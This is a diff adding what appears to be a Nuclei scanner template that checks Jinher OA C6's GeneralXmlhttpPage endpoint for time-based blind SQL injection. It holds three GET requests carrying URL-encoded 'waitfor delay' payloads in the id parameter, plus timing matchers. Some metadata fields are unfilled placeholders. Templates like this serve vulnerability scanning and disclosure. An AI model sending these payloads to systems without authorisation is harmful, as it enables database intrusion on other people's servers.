@@ -1,0 +1,25 @@
+id: jinher-eneralXmlhttpPagep-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 金和OA C6 GeneralXmlhttpPage存在sql注入漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A3--"
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A6--"
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A9--"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
